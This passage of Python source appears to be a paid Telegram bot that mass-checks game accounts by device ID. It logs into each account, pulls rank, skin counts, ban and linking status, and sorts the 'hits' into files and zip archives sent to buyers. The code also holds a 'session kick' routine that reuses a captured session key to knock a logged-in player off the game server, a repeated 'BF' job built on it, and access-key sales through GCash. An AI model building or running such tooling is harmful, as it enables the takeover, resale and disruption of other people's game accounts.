    if is_banned:
        banned_file = os.path.join(base, FOLDERS["error"], "banned_accounts.txt")
        os.makedirs(os.path.dirname(banned_file), exist_ok=True)
        with save_lock:
            with open(banned_file, "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK:
            HIT_COUNTERS['banned'] += 1
        return None

    nick = player_data.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", "", "n/a"):
        return None

    player_data['account_id'] = acc
    player_data['zone_id']    = zone

    card_text = format_card_v2(device, player_data)
    json_obj  = card_to_json(device, player_data)

    v2l = str(player_data.get('v2l_status', 'N/A')).lower()
    v2l_active   = v2l in ('enabled','yes','1','true')
    v2l_inactive = v2l in ('disabled','no','0','false')

    cur_rank = player_data.get('current_rank', 'Unranked')
    rank_category = get_rank_category(cur_rank)
    skin_cnt = player_data.get('skin_count', 0) or 0

    rf_map = {
        "warrior": os.path.join(base, FOLDERS["rank_warrior"], "warrior_hits.txt"),
        "elite":   os.path.join(base, FOLDERS["rank_elite"],   "elite_hits.txt"),
        "master":  os.path.join(base, FOLDERS["rank_master"],  "master_hits.txt"),
        "gm":      os.path.join(base, FOLDERS["rank_gm"],      "grandmaster_hits.txt"),
        "epic":    os.path.join(base, FOLDERS["rank_epic"],    "epic_hits.txt"),
        "legend":  os.path.join(base, FOLDERS["rank_legend"],  "legend_hits.txt"),
        "mythic":  os.path.join(base, FOLDERS["rank_mythic"],  "mythic_hits.txt"),
    }

    json_path = None
    with save_lock:
        all_file = os.path.join(base, FOLDERS["detail"], "all_hits_detail.txt")
        os.makedirs(os.path.dirname(all_file), exist_ok=True)
        if not is_already_saved(device, all_file):
            with open(all_file, "a", encoding='utf-8') as f:
                f.write(card_text + "\n\n")

        raw_file = os.path.join(base, FOLDERS["detail"], "raw_devices_detail.txt")
        if not is_already_saved(device, raw_file):
            with open(raw_file, "a", encoding='utf-8') as f:
                f.write(f"{device}\n")

        rank_file = rf_map.get(rank_category)
        if rank_file:
            os.makedirs(os.path.dirname(rank_file), exist_ok=True)
            if not is_already_saved(device, rank_file):
                with open(rank_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n\n")

        if v2l_active:
            vf = os.path.join(base, FOLDERS["v2l_active"], "v2l_active.txt")
            os.makedirs(os.path.dirname(vf), exist_ok=True)
            if not is_already_saved(device, vf):
                with open(vf, "a", encoding='utf-8') as f: f.write(card_text + "\n\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_active'] += 1
        elif v2l_inactive:
            vf = os.path.join(base, FOLDERS["v2l_inactive"], "v2l_inactive.txt")
            os.makedirs(os.path.dirname(vf), exist_ok=True)
            if not is_already_saved(device, vf):
                with open(vf, "a", encoding='utf-8') as f: f.write(card_text + "\n\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_inactive'] += 1

        if skin_cnt >= 200:
            sf = os.path.join(base, FOLDERS["sultan"], "sultan.txt")
            os.makedirs(os.path.dirname(sf), exist_ok=True)
            if not is_already_saved(device, sf):
                with open(sf, "a", encoding='utf-8') as f: f.write(card_text + "\n\n")
            with COUNTER_LOCK: HIT_COUNTERS['sultan'] += 1

        json_dir = os.path.join(base, "json_hits")
        os.makedirs(json_dir, exist_ok=True)
        fname = f"{str(acc)}_{str(zone)}_{uuid.uuid4().hex[:6]}.json"
        json_path = os.path.join(json_dir, fname)
        with open(json_path, "w", encoding='utf-8') as jf:
            json.dump(json_obj, jf, indent=2, ensure_ascii=False)

    with COUNTER_LOCK:
        if rank_category in HIT_COUNTERS:
            HIT_COUNTERS[rank_category] += 1

    return json_path

# ────────────────────────────────────────────────────────────────
# DETAIL CHECK ENGINE
# ────────────────────────────────────────────────────────────────

def process_detail(device_id: str, account_id: int, zone_id: int,
                   out_dir: str = None,
                   want_debug: bool = False) -> Tuple[bool, Optional[dict], Optional[dict]]:
    """
    Returns (success, player_data, debug_bundle).
    debug_bundle is a dict of every raw response when want_debug is True.
    """
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                if 'ban' in conn.ban_status.lower():
                    save_account_v2(
                        {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                        {'ban_status': conn.ban_status, 'nickname': 'BANNED',
                         'account_id': account_id, 'zone_id': zone_id},
                        out_dir
                    )
                return False, None, (conn.debug_responses if want_debug else None)
            if not conn.get_game_server() or not conn.connect_to_game_server():
                return False, None, (conn.debug_responses if want_debug else None)

            skin_info     = conn.get_skin_role_info(account_id, zone_id)
            ban_stat      = conn.check_ban_status()
            v2l           = get_v2l_status(conn, account_id, zone_id)
            result        = conn.lookup_player(account_id)
            role_info     = conn.get_role_info(account_id, zone_id)
            player_detail = conn.get_player_detail(account_id, zone_id)
            guild_info    = conn.get_guild_info(account_id, zone_id)
            hero_hist     = conn.get_hero_history(account_id, zone_id)
            collector_inf = conn.get_collector_info(account_id, zone_id)

            # Debug bundle (raw)
            debug_bundle = conn.debug_responses if want_debug else None

            pd = {}
            if result and isinstance(result, dict):
                if isinstance(result.get(0), list) and len(result[0]) > 0 and isinstance(result[0][0], dict):
                    pd = result[0][0]
                elif isinstance(result.get(0), dict):
                    pd = result[0]
                else:
                    pd = result

            skin_info     = skin_info     if isinstance(skin_info, dict)     else {}
            role_info     = role_info     if isinstance(role_info, dict)     else {}
            player_detail = player_detail if isinstance(player_detail, dict) else {}
            guild_info    = guild_info    if isinstance(guild_info, dict)    else {}
            hero_hist     = hero_hist     if isinstance(hero_hist, dict)     else {}
            collector_inf = collector_inf if isinstance(collector_inf, dict) else {}

            # All sources to probe for values
            sources = [pd, skin_info, role_info, player_detail, collector_inf, guild_info, hero_hist, result or {}]

            # ─── Basic identity ───
            nick  = _first_string(pd, [2]) or _first_string(skin_info, [2]) \
                    or _first_string(role_info, [2]) or f"Player_{account_id}"
            level = _first_int(pd, [3]) or _first_int(skin_info, [3]) or _first_int(role_info, [3]) or 1

            # ─── Counts ───
            skin_cnt = _first_int(skin_info, [10])
            if skin_cnt is None: skin_cnt = _first_int(pd, [83])
            if skin_cnt is None: skin_cnt = 0

            hero_cnt = _first_int(skin_info, [9])
            if hero_cnt is None: hero_cnt = _first_int(role_info, [9])
            if hero_cnt is None: hero_cnt = 0

            matches = _extract_matches(pd, skin_info, role_info, player_detail) or "N/A"

            # ─── Rank ───
            cur_rank_val = (_first_int(pd, [8]) or _first_int(skin_info, [6])
                            or _first_int(role_info, [8]) or 0)
            max_rank_val = (_first_int(pd, [95]) or _first_int(skin_info, [15])
                            or _first_int(role_info, [9]) or 0)

            # ─── Collector ───
            coll_tier, coll_points = _extract_collector_info(*sources)
            if coll_points is None:
                # try the "achievement" style big numbers
                for src in sources:
                    for t in (84, 90, 91, 92, 93, 94, 96, 97, 98, 99):
                        v = src.get(t)
                        if isinstance(v, int) and not isinstance(v, bool) and 1000 < v < 10**9:
                            coll_points = v
                            break
                    if coll_points: break

            # ─── Achievement ───
            achievement = None
            for src in sources:
                for t in (96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108):
                    v = src.get(t)
                    if isinstance(v, int) and not isinstance(v, bool) and v > 0:
                        achievement = v
                        break
                if achievement: break

            # ─── Last login ───
            last_login = _extract_last_login(*sources)

            # ─── Countries ───
            login_c, reg_c = _extract_countries(*sources)

            # ─── Squad NAME ───
            squad = _extract_squad_name(*sources)

            # ─── Hero history ───
            hero_list = _extract_hero_history(*sources)

            # ─── Created ts ───
            created_raw = None
            for src in sources:
                for t in (42, 43, 44, 45, 46, 47, 48, 49, 50):
                    v = src.get(t)
                    if _looks_like_unix_ts(v):
                        created_raw = v
                        break
                if created_raw: break
            if created_raw is None and conn.creation_ts:
                created_raw = conn.creation_ts

            created_at = ""
            if created_raw and _looks_like_unix_ts(created_raw):
                try:
                    dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
                    created_at = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                except: pass

            player_data = {
                'nickname':         nick,
                'level':            level,
                'skin_count':       skin_cnt,
                'hero_count':       hero_cnt,
                'matches':          matches,
                'current_rank':     map_rank(cur_rank_val),
                'highest_rank':     map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
                'ban_status':       ban_stat,
                'v2l_status':       v2l,
                'created_at':       created_at,
                'collector':        coll_tier or "N/A",
                'collector_points': coll_points,
                'achievement':      achievement,
                'location':         "NOT FOUND",
                'last_login':       last_login or "N/A",
                'login_country':    login_c,
                'reg_country':      reg_c,
                'squad':            squad or "N/A",
                'hero_history':     hero_list,
                'skin_breakdown':   parse_skin_breakdown(skin_info.get(92, [])),
                'device_id':        device_id,
                'account_id':       account_id,
                'zone_id':          zone_id,
            }
            save_account_v2(
                {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                player_data, out_dir
            )
            return True, player_data, debug_bundle
    except Exception as e:
        log.error(f"process_detail error: {e}")
        return False, None, None

# ────────────────────────────────────────────────────────────────
# SESSION PROFILE (for BF)
# ────────────────────────────────────────────────────────────────

def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
    acc, zone, stat = GameLogin(device_id).run()
    if not acc or not zone: return None
    try:
        conn = GameConnection(device_id=device_id)
        if not conn.login_to_login_server(): return None
        if not conn.get_game_server() or not conn.connect_to_game_server(): return None
        skin_info    = conn.get_skin_role_info(acc, zone)
        ban_stat     = conn.check_ban_status()
        sess_key     = conn.session_key
        gs_host      = conn.game_host
        gs_port      = conn.game_port
        creation_ts  = conn.creation_ts
        conn.cleanup()
        skin_info  = skin_info if isinstance(skin_info, dict) else {}
        nick       = skin_info.get(2) or f"Player_{acc}"
        level      = skin_info.get(3) or 1
        skin_cnt   = skin_info.get(10) if skin_info.get(10) is not None else 0
        hero_cnt   = skin_info.get(9)  if skin_info.get(9)  is not None else 0
        cur_rank_v = skin_info.get(6, 0) or 0
        max_rank_v = skin_info.get(15, 0) or cur_rank_v
        return {
            'device_id':    device_id,
            'account_id':   acc,
            'session_key':  sess_key,
            'zone_id':      zone,
            'creation_ts':  creation_ts,
            'game_host':    gs_host,
            'game_port':    gs_port,
            'gs_info':      f"{gs_host}:{gs_port}",
            'nickname':     nick,
            'level':        level,
            'rank':         map_rank(cur_rank_v),
            'highest_rank': map_rank(max_rank_v) if max_rank_v else map_rank(cur_rank_v),
            'skin_count':   skin_cnt,
            'hero_count':   hero_cnt,
            'ban_status':   ban_stat,
        }
    except: return None

def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0   = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))
        body_struct = SdpStruct({
            0: profile['account_id'], 1: profile['session_key'],
            2: profile['zone_id'],    4: CLIENT_VERSION,
            13: CHANNEL,              15: profile['device_id']
        }).data
        pkt   = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
        comp  = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)
        q = b''
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
        got_ack = False
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big')
            sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d: break
                q += d
            got_ack = len(q) >= sz
        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, str(e)

# ────────────────────────────────────────────────────────────────
# GLOBAL STATE
# ────────────────────────────────────────────────────────────────

active_jobs: Dict[int, Dict] = {}
job_lock  = threading.Lock()
start_time = time.time()

_bf_stop_flags: Dict[int, threading.Event] = {}
_bf_lock = threading.Lock()

# ────────────────────────────────────────────────────────────────
# USER MANAGER
# ────────────────────────────────────────────────────────────────

class UserManager:
    def __init__(self): self._load_data()

    def _load_data(self):
        if USERS_FILE.exists():
            try:
                data = json.loads(USERS_FILE.read_text())
                self.users = data if "users" in data else {"users": {}}
            except: self.users = {"users": {}}
        else: self.users = {"users": {}}
        if KEYS_FILE.exists():
            try:
                data = json.loads(KEYS_FILE.read_text())
                self.keys = data if "keys" in data else {"keys": {}}
            except: self.keys = {"keys": {}}
        else: self.keys = {"keys": {}}
        self._save_users_sync(); self._save_keys_sync()

    def _save_users_sync(self): USERS_FILE.write_text(json.dumps(self.users, indent=2))
    def _save_keys_sync(self):  KEYS_FILE.write_text(json.dumps(self.keys, indent=2))
    async def _save_users(self): self._save_users_sync()
    async def _save_keys(self):  self._save_keys_sync()

    async def register_user(self, user_id, username=None, first_name=None):
        uid = str(user_id)
        if uid not in self.users["users"]:
            self.users["users"][uid] = {
                "username": username, "first_name": first_name,
                "joined": datetime.now().isoformat(),
                "banned": False, "key_expiry": None, "is_admin": False,
                "threads_limit": MAX_THREADS_DEFAULT,
                "stats": {"total_checked": 0, "total_hits": 0},
                "vip": False, "activated": False,
            }
            await self._save_users(); return True
        return False

    async def is_authorized(self, user_id):
        uid = str(user_id)
        if uid == str(OWNER_ID): return True, "admin"
        user = self.users["users"].get(uid)
        if not user: return False, "not_registered"
        if user.get("banned", False): return False, "banned"
        expiry = user.get("key_expiry")
        if expiry is None: return False, "no_key"
        try:
            if datetime.fromisoformat(expiry) < datetime.now(): return False, "key_expired"
        except: return False, "invalid_expiry"
        return True, "ok"

    async def ban_user(self, user_id):
        uid = str(user_id)
        if uid in self.users["users"]:
            self.users["users"][uid]["banned"] = True
            await self._save_users(); return True
        return False

    async def unban_user(self, user_id):
        uid = str(user_id)
        if uid in self.users["users"]:
            self.users["users"][uid]["banned"] = False
            await self._save_users(); return True
        return False

    async def set_key_expiry(self, user_id, expiry_dt):
        uid = str(user_id)
        if uid not in self.users["users"]: return False
        self.users["users"][uid]["key_expiry"]  = expiry_dt.isoformat()
        self.users["users"][uid]["activated"]   = True
        await self._save_users(); return True

    async def generate_key(self, duration, unit, quantity=1, max_users=1):
        if unit in ['lifetime', 'l']:
            expiry = datetime(9999, 12, 31, 23, 59, 59)
            unit_display = "🌟 Lifetime"
        else:
            unit_map = {'s':1,'m':60,'h':3600,'d':86400,'y':31536000,
                        'hours':3600,'days':86400,'months':2592000,'lifetime':0}
            seconds  = duration * unit_map.get(unit.lower(), 86400)
            expiry   = datetime.now() + timedelta(seconds=seconds)
            unit_display = f"{duration} {unit}"
        keys = []
        for _ in range(quantity):
            key = f"SHIN-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            while key in self.keys["keys"]:
                key = f"SHIN-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            self.keys["keys"][key] = {
                "created":   datetime.now().isoformat(),
                "expiry":    expiry.isoformat(),
                "used_by":   [], "duration": unit_display,
                "max_users": max_users, "dtype": unit, "dval": duration,
            }
            keys.append(key)
        await self._save_keys()
        return keys, unit_display

    async def redeem_key(self, user_id, key):
        uid      = str(user_id)
        key_data = self.keys["keys"].get(key)
        if not key_data: return False, "Invalid key"
        used = key_data.get("used_by", [])
        if uid in used: return False, "Key already used by you"
        if len(used) >= key_data.get("max_users", 1): return False, "Key max users reached"
        exp = datetime.fromisoformat(key_data["expiry"])
        if exp < datetime.now(): return False, "Key expired"
        used.append(uid); key_data["used_by"] = used
        await self._save_keys()
        await self.set_key_expiry(user_id, exp)
        return True, f"Key redeemed! Valid until {exp.strftime('%Y-%m-%d %H:%M')}"

    async def get_all_users(self): return self.users["users"]
    async def get_user_info(self, user_id): return self.users["users"].get(str(user_id))

    async def get_threads_limit(self, user_id):
        user = self.users["users"].get(str(user_id))
        if not user: return MAX_THREADS_DEFAULT
        return user.get("threads_limit", MAX_THREADS_DEFAULT)

    async def set_threads_limit(self, user_id, limit):
        uid  = str(user_id); user = self.users["users"].get(uid)
        if not user: return False
        if not (MIN_THREADS <= limit <= MAX_THREADS_LIMIT): return False
        user["threads_limit"] = limit
        await self._save_users(); return True

    async def add_vip(self, user_id):
        uid = str(user_id)
        if uid in self.users["users"]:
            self.users["users"][uid]["vip"] = True
            self.users["users"][uid]["activated"] = True
            await self._save_users(); return True
        return False

    async def remove_vip(self, user_id):
        uid = str(user_id)
        if uid in self.users["users"]:
            self.users["users"][uid]["vip"] = False
            await self._save_users(); return True
        return False

    async def update_stats(self, user_id, checked=0, hits=0):
        uid  = str(user_id); user = self.users["users"].get(uid)
        if not user: return
        stats = user.setdefault("stats", {})
        stats["total_checked"] = stats.get("total_checked", 0) + checked
        stats["total_hits"]    = stats.get("total_hits", 0) + hits
        await self._save_users()

user_manager = UserManager()

# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────

DEFAULT_CONFIG = {"locked": False, "global_limit": None, "vip_limit": None, "txn_counter": 0}

def load_config():
    if CONFIG_FILE.exists():
        try:
            cfg = json.loads(CONFIG_FILE.read_text())
            for k, v in DEFAULT_CONFIG.items(): cfg.setdefault(k, v)
            return cfg
        except: pass
    return DEFAULT_CONFIG.copy()

def save_config(cfg): CONFIG_FILE.write_text(json.dumps(cfg, indent=2))

def get_next_txn_number():
    cfg = load_config()
    cfg["txn_counter"] = cfg.get("txn_counter", 0) + 1
    save_config(cfg)
    return cfg["txn_counter"]

# ────────────────────────────────────────────────────────────────
# GCASH PLANS
# ────────────────────────────────────────────────────────────────

GCASH_PLANS = {
    "plan_3d":   {"label": "3 Days",   "price": "₱50",  "dtype": "days",     "dval": 3},
    "plan_7d":   {"label": "7 Days",   "price": "₱70",  "dtype": "days",     "dval": 7},
    "plan_30d":  {"label": "1 Month",  "price": "₱100", "dtype": "days",     "dval": 30},
    "plan_life": {"label": "Lifetime", "price": "₱150", "dtype": "lifetime", "dval": 0},
}

# ────────────────────────────────────────────────────────────────
# KEYBOARDS
# ────────────────────────────────────────────────────────────────

def kb_no_key():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Buy Access Key", callback_data="menu_buy")],
        [InlineKeyboardButton("📖 Help", callback_data="menu_help")],
    ])

def kb_main_user():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Bulk Check", callback_data="tool_bulk")],
        [InlineKeyboardButton("🔍 Single Account Check", callback_data="tool_single")],
        [InlineKeyboardButton("📊 Statistics", callback_data="tool_stats")],
        [InlineKeyboardButton("💳 Buy Key", callback_data="menu_buy"),
         InlineKeyboardButton("📖 Help", callback_data="menu_help")],
    ])

def kb_main_admin():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Bulk Check", callback_data="tool_bulk")],
        [InlineKeyboardButton("🔍 Single Account Check", callback_data="tool_single")],
        [InlineKeyboardButton("📊 Statistics", callback_data="tool_stats")],
        [InlineKeyboardButton("💳 Buy Key", callback_data="menu_buy"),
         InlineKeyboardButton("📖 Help", callback_data="menu_help")],
        [InlineKeyboardButton("👑 ADMIN PANEL", callback_data="open_admin_panel")],
    ])

def kb_admin_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key",    callback_data="adm_genkey"),
         InlineKeyboardButton("👥 Users",      callback_data="adm_users")],
        [InlineKeyboardButton("📊 Stats",      callback_data="adm_stats"),
         InlineKeyboardButton("⚡ Running",    callback_data="adm_running")],
        [InlineKeyboardButton("🔒 Lock/Unlock",callback_data="adm_toggle_lock"),
         InlineKeyboardButton("🔄 Refresh",   callback_data="adm_refresh")],
        [InlineKeyboardButton("📢 Broadcast",  callback_data="adm_broadcast_help")],
    ])

def kb_gcash_plans():
    rows = []
    for pk, pd in GCASH_PLANS.items():
        rows.append([InlineKeyboardButton(
            f"{pd['label']}  ·  {pd['price']}",
            callback_data=f"gcash_sel:{pk}")])
    return InlineKeyboardMarkup(rows)

def kb_gcash_admin(buyer_uid, plan_key):
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✔ APPROVE", callback_data=f"gcash_approve:{buyer_uid}:{plan_key}"),
        InlineKeyboardButton("✖ DENY",    callback_data=f"gcash_deny:{buyer_uid}:{plan_key}"),
    ]])

def fmt_expiry(exp):
    if not exp: return "Lifetime"
    try:
        e = datetime.fromisoformat(exp)
        if e < datetime.now(): return "Expired"
        diff = e - datetime.now()
        d, h = diff.days, diff.seconds // 3600
        m = (diff.seconds % 3600) // 60
        parts = []
        if d: parts.append(f"{d}d")
        if h: parts.append(f"{h}h")
        if m and not d: parts.append(f"{m}m")
        return " ".join(parts) + " left"
    except: return exp

def admin_only(fn):
    from functools import wraps
    @wraps(fn)
    async def wrapper(update, context):
        if update.effective_user.id != OWNER_ID:
            await update.message.reply_text("❌ Admin only.")
            return
        return await fn(update, context)
    return wrapper

# ────────────────────────────────────────────────────────────────
# LIVE STATS
# ────────────────────────────────────────────────────────────────

class LiveStats:
    def __init__(self, total: int):
        self.lock = threading.Lock()
        self.total = total
        self.checked = 0
        self.hits = 0
        self.banned = 0
        self.failed = 0
        self.start_ts = time.time()
        self.recent = []
        self.window = 20

    def inc(self, key: str, n: int = 1):
        with self.lock:
            setattr(self, key, getattr(self, key) + n)
            if key == "checked":
                now = time.time()
                self.recent.append(now)
                cut = now - self.window
                self.recent = [t for t in self.recent if t >= cut]

    def snapshot(self):
        with self.lock:
            now = time.time()
            elapsed = max(now - self.start_ts, 0.001)
            recent_span = 0.0; recent_count = 0
            if len(self.recent) >= 2:
                recent_span = self.recent[-1] - self.recent[0]
                recent_count = len(self.recent) - 1
            live_rate = (recent_count / recent_span) if recent_span > 0.5 else (self.checked / elapsed)
            avg_rate = self.checked / elapsed
            remaining = max(self.total - self.checked, 0)
            eta = (remaining / live_rate) if live_rate > 0.01 else 0
            return {
                "total": self.total, "checked": self.checked, "hits": self.hits,
                "banned": self.banned, "failed": self.failed,
                "elapsed": elapsed, "avg_rate": avg_rate, "live_rate": live_rate,
                "eta": eta,
            }

def _bar(pct: float, width: int = 20) -> str:
    filled = int(width * pct / 100)
    return "█" * filled + "░" * (width - filled)

def _fmt_secs(s: float) -> str:
    s = int(max(0, s))
    if s < 60: return f"{s}s"
    m, s = divmod(s, 60)
    if m < 60: return f"{m}m{s}s"
    h, m = divmod(m, 60)
    return f"{h}h{m}m"

def render_live(snap, status="RUNNING"):
    total = max(snap["total"], 1)
    pct   = snap["checked"] / total * 100
    icon  = {"RUNNING": "⚡", "STOPPING": "🛑", "FINISHED": "✅"}.get(status, "⚡")
    return (
        f"{icon} *{BOT_NAME} — Bulk Check*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"`{_bar(pct)}` *{pct:5.1f}%*\n\n"
        f"🎯 *Hits*     : `{snap['hits']}`\n"
        f"🚫 *Banned*   : `{snap['banned']}`\n"
        f"❌ *Failed*   : `{snap['failed']}`\n"
        f"📦 *Progress* : `{snap['checked']}/{snap['total']}`\n"
        f"⚡ *Rate*     : `{snap['live_rate']:.1f}/s` (avg `{snap['avg_rate']:.1f}/s`)\n"
        f"⏱️ *Elapsed*  : `{_fmt_secs(snap['elapsed'])}`\n"
        f"⏳ *ETA*      : `{_fmt_secs(snap['eta'])}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 {BRAND}"
    )

# ────────────────────────────────────────────────────────────────
# BULK RUNNER
# ────────────────────────────────────────────────────────────────

TG_MAX_BYTES = 49 * 1024 * 1024

def zip_results(folder: Path) -> List[Path]:
    folder = Path(folder)
    files  = sorted([f for f in folder.rglob("*") if f.is_file() and not f.name.endswith(".zip")])
    if not files: return []
    out = folder / "results.zip"
    try:
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in files:
                zf.write(f, f.relative_to(folder))
        if out.stat().st_size <= TG_MAX_BYTES: return [out]
        out.unlink()
        parts, part_num, cur_files, cur_size = [], 1, [], 0
        for f in files:
            fsize = f.stat().st_size
            if cur_files and cur_size + fsize > TG_MAX_BYTES:
                pout = folder / f"results_part{part_num}.zip"
                with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
                    for cf in cur_files: zf.write(cf, cf.relative_to(folder))
                parts.append(pout); part_num += 1; cur_files = []; cur_size = 0
            cur_files.append(f); cur_size += fsize
        if cur_files:
            pout = folder / f"results_part{part_num}.zip"
            with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
                for cf in cur_files: zf.write(cf, cf.relative_to(folder))
            parts.append(pout)
        return parts
    except Exception as e:
        log.error(f"Zip error: {e}")
        return []

def run_bulk_job(job: dict, loop, app):
    user_id  = job["user_id"]
    chat_id  = job["chat_id"]
    msg_id   = job["msg_id"]
    devices  = job["devices"]
    threads  = job["threads"]

    session_ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_dir = os.path.join(RESULTS_DIR, f"session_{user_id}_{session_ts}")
    os.makedirs(session_dir, exist_ok=True)
    for sub in FOLDERS.values():
        os.makedirs(os.path.join(session_dir, sub), exist_ok=True)

    stats = LiveStats(len(devices))

    _last_update = [0.0]
    _UPDATE_MIN  = 1.5

    def update_msg(force=False, status="RUNNING"):
        now = time.time()
        if not force and (now - _last_update[0]) < _UPDATE_MIN: return
        _last_update[0] = now
        snap = stats.snapshot()
        text = render_live(snap, status)
        kb = [[InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(
                app.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=text, parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup(kb)
                ), loop
            )
            fut.result(timeout=10)
        except Exception as e:
            log.debug(f"update_msg edit skipped: {e}")

    import queue as _queue
    hit_queue = _queue.Queue()

    def hit_sender():
        while True:
            msg = hit_queue.get()
            if msg is None: break
            for attempt in range(3):
                try:
                    fut = asyncio.run_coroutine_threadsafe(
                        app.bot.send_message(chat_id=chat_id, text=msg, parse_mode="Markdown"),
                        loop
                    )
                    fut.result(timeout=30)
                    time.sleep(0.4)
                    break
                except Exception as e:
                    log.error(f"Hit sender attempt {attempt+1}: {e}")
                    time.sleep(1.5)

    hs_thread = threading.Thread(target=hit_sender, daemon=False)
    hs_thread.start()

    def worker(device_id: str):
        if job.get("stopped"): return
        acc, zone, stat = GameLogin(device_id).run()
        if not acc or not zone:
            stats.inc("checked")
            if 'ban' in stat.lower(): stats.inc("banned")
            else:                     stats.inc("failed")
            update_msg()
            return

        success, pd, _ = process_detail(device_id, acc, zone, session_dir)
        stats.inc("checked")

        if success and pd:
            is_banned = 'ban' in str(pd.get('ban_status', '')).lower()
            if is_banned:
                stats.inc("banned")
            elif str(pd.get('nickname','')).lower() not in ('', 'n/a', 'unknown', 'guest'):
                stats.inc("hits")
            pd['account_id'] = acc
            pd['zone_id']    = zone
            card = format_card_v2(device_id, pd)
            hit_queue.put(f"```\n{card}\n```")
        else:
            stats.inc("failed")
        update_msg()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(worker, dev) for dev in devices]
        while True:
            snap = stats.snapshot()
            done = (snap["checked"] >= snap["total"]) or job.get("stopped")
            update_msg()
            if done: break
            time.sleep(0.4)
        update_msg(force=True, status="STOPPING")
        for f in futures: f.cancel()

    hit_queue.put(None)
    hs_thread.join(timeout=180)

    asyncio.run_coroutine_threadsafe(
        user_manager.update_stats(user_id, checked=stats.checked, hits=stats.hits),
        loop
    )

    snap = stats.snapshot()
    elapsed = int(snap["elapsed"])
    summary = (
        f"🏁 *Bulk Check Complete!*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📦 Total   : `{snap['total']}`\n"
        f"🎯 Hits    : `{snap['hits']}`\n"
        f"🚫 Banned  : `{snap['banned']}`\n"
        f"❌ Failed  : `{snap['failed']}`\n\n"
        f"⏱ Time    : `{_fmt_secs(elapsed)}`\n"
        f"⚡ Speed   : `{snap['avg_rate']:.1f}/s`\n\n"
        f"👑 *{BRAND}*"
    )
    time.sleep(0.8)
    edited = False
    for attempt in range(4):
        try:
            fut = asyncio.run_coroutine_threadsafe(
                app.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=summary, parse_mode="Markdown"
                ), loop
            )
            fut.result(timeout=30)
            edited = True; break
        except Exception as e:
            log.warning(f"Summary edit attempt {attempt+1}: {e}")
            time.sleep(2)

    if not edited:
        for _ in range(3):
            try:
                fut = asyncio.run_coroutine_threadsafe(
                    app.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown"),
                    loop
                )
                fut.result(timeout=30); break
            except Exception as e:
                log.error(f"Summary send: {e}")
                time.sleep(2)

    try:
        zips = zip_results(Path(session_dir))
        for zp in zips[:3]:
            for attempt in range(3):
                try:
                    with open(zp, "rb") as f:
                        fut = asyncio.run_coroutine_threadsafe(
                            app.bot.send_document(
                                chat_id=chat_id, document=f,
                                filename=f"shin_results_{session_ts}.zip"
                            ), loop
                        )
                        fut.result(timeout=60)
                    break
                except Exception as e:
                    log.error(f"Send zip attempt {attempt+1}: {e}")
                    time.sleep(2)
        try: shutil.rmtree(session_dir, ignore_errors=True)
        except: pass
    except Exception as e:
        log.error(f"Zip send error: {e}")

    with job_lock:
        active_jobs.pop(user_id, None)

# ────────────────────────────────────────────────────────────────
# BF JOB
# ────────────────────────────────────────────────────────────────

def run_bf_job(job: dict, loop, app):
    user_id  = job["user_id"]; chat_id = job["chat_id"]; msg_id = job["msg_id"]
    profile  = job["profile"]; loops = job["loops"]; delay = job["delay"]
    stop_ev  = job["stop_event"]
